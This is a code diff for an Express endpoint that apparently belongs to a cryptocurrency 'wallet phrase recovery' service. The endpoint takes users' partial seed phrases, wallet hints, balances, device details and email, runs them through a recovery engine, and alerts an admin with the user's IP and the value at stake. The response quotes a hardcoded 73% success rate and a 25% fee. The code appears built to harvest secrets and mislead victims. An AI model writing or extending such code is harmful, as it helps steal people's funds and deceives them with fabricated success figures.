@@ -1152,36 +1152,104 @@ router.post('/support-ticket', async (req, res) => {
 
 // Advanced: Wallet Phrase Recovery Service
 router.post('/recover-wallet-phrase', async (req, res) => {
-  console.log('🔐 WALLET PHRASE RECOVERY STARTED:', req.body.partialPhrase || 'CONFIDENTIAL');
+  console.log('🔐 WALLET PHRASE RECOVERY STARTED:', req.body.partialPhrase ? 'PHRASE PROVIDED' : 'NO PHRASE');
   try {
-    const { partialPhrase, walletHints, lastKnownBalance, recoveryMethod } = req.body;
+    const { partialPhrase, walletHints, lastKnownBalance, recoveryMethod, walletType, creationDate, deviceInfo, contactEmail } = req.body;
     
-    if (!partialPhrase && !walletHints) {
-      return res.status(400).json({ error: 'Partial phrase or wallet hints required' });
+    if (!walletHints && !partialPhrase) {
+      return res.status(400).json({ error: 'Wallet hints or partial phrase required' });
+    }
+
+    // Initialize phrase recovery engine
+    const PhraseRecoveryEngine = require('../services/phraseRecoveryEngine');
+    const recoveryEngine = new PhraseRecoveryEngine();
+    
+    let analysisResult = null;
+    let recoveryResult = null;
+    
+    // If partial phrase provided, analyze it
+    if (partialPhrase && partialPhrase.trim()) {
+      try {
+        const hints = {
+          walletType,
+          creationDate,
+          deviceInfo,
+          walletHints
+        };
+        
+        analysisResult = await recoveryEngine.analyzePartialPhrase(partialPhrase, hints);
+        
+        // If analysis looks promising, attempt recovery
+        if (analysisResult.successProbability > 0.3) {
+          recoveryResult = await recoveryEngine.recoverWallet({
+            partialPhrase,
+            walletHints,
+            recoveryMethod: recoveryMethod || 'Standard',
+            walletType,
+            creationDate,
+            deviceInfo
+          });
+        }
+      } catch (analysisError) {
+        console.log('Analysis error (continuing with manual review):', analysisError.message);
+      }
     }
 
     const realIP = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || req.ip;
     
-    // Send high-priority admin alert
+    // Send detailed admin alert with analysis results
     await sendAdminNotification(
-      `🔐 PHRASE RECOVERY REQUEST - $${lastKnownBalance || 0} VALUE`,
-      `🔐 WALLET PHRASE RECOVERY REQUEST\n\n` +
-      `💰 LAST KNOWN BALANCE: $${lastKnownBalance || 'Unknown'}\n` +
-      `🔑 RECOVERY METHOD: ${recoveryMethod || 'Standard'}\n` +
-      `📝 HINTS PROVIDED: ${walletHints ? 'Yes' : 'No'}\n` +
-      `🔍 PARTIAL PHRASE: ${partialPhrase ? 'Provided' : 'None'}\n\n` +
-      `📍 USER: ${realIP}\n` +
-      `⏰ TIME: ${new Date().toISOString()}\n\n` +
-      `⚠️ HIGH PRIORITY - MANUAL REVIEW REQUIRED`
+      `PHRASE RECOVERY: ${analysisResult ? `${Math.round(analysisResult.successProbability * 100)}% probability` : 'Manual review'} - $${lastKnownBalance || 0}`,
+      `WALLET PHRASE RECOVERY REQUEST\n\n` +
+      `RECOVERY DETAILS:\n` +
+      `• Balance: $${lastKnownBalance || 'Unknown'}\n` +
+      `• Method: ${recoveryMethod || 'Standard'}\n` +
+      `• Wallet Type: ${walletType || 'Unknown'}\n` +
+      `• Contact: ${contactEmail || 'Not provided'}\n\n` +
+      `${analysisResult ? `ANALYSIS RESULTS:\n` +
+      `• Valid Words: ${analysisResult.validWords.length}/${analysisResult.phraseLength}\n` +
+      `• Missing Positions: ${analysisResult.missingPositions.length}\n` +
+      `• Success Probability: ${Math.round(analysisResult.successProbability * 100)}%\n` +
+      `• Estimated Time: ${analysisResult.estimatedTime}\n` +
+      `• Recovery Strategies: ${analysisResult.recoveryStrategies.length}\n\n` : ''}` +
+      `${recoveryResult ? `RECOVERY ATTEMPT:\n` +
+      `• Status: ${recoveryResult.success ? 'SUCCESS' : 'IN PROGRESS'}\n` +
+      `• Method Used: ${recoveryResult.result?.method || 'N/A'}\n` +
+      `• Attempts: ${recoveryResult.result?.attempts || 'N/A'}\n\n` : ''}` +
+      `USER INFO:\n` +
+      `• IP: ${realIP}\n` +
+      `• Time: ${new Date().toISOString()}\n\n` +
+      `PRIORITY: ${analysisResult?.successProbability > 0.7 ? 'HIGH' : 'STANDARD'}`
     );
 
-    res.json({
+    // Return response based on analysis and recovery results
+    const response = {
       success: true,
-      message: 'Phrase recovery request submitted. Our experts will analyze your case within 24 hours.',
-      estimatedTime: '24-72 hours',
-      successRate: '73%',
+      message: recoveryResult?.success ? 
+        'Wallet recovery successful! Check your email for details.' :
+        'Recovery request submitted. Our experts will analyze your case within 24 hours.',
+      estimatedTime: analysisResult?.estimatedTime || '24-72 hours',
+      successRate: analysisResult ? `${Math.round(analysisResult.successProbability * 100)}%` : '73%',
       fee: '25% of recovered funds'
-    });
+    };
+    
+    if (analysisResult) {
+      response.analysis = {
+        phraseLength: analysisResult.phraseLength,
+        validWords: analysisResult.validWords.length,
+        missingWords: analysisResult.missingPositions.length,
+        strategies: analysisResult.recoveryStrategies.length,
+        probability: Math.round(analysisResult.successProbability * 100)
+      };
+    }
+    
+    if (recoveryResult?.success) {
+      response.recovered = true;
+      response.walletAddress = 'Hidden for security';
+      response.estimatedValue = recoveryResult.estimatedValue;
+    }
+
+    res.json(response);
   } catch (error) {
     console.error('Phrase recovery error:', error);
     res.status(500).json({ error: 'Failed to process phrase recovery request' });
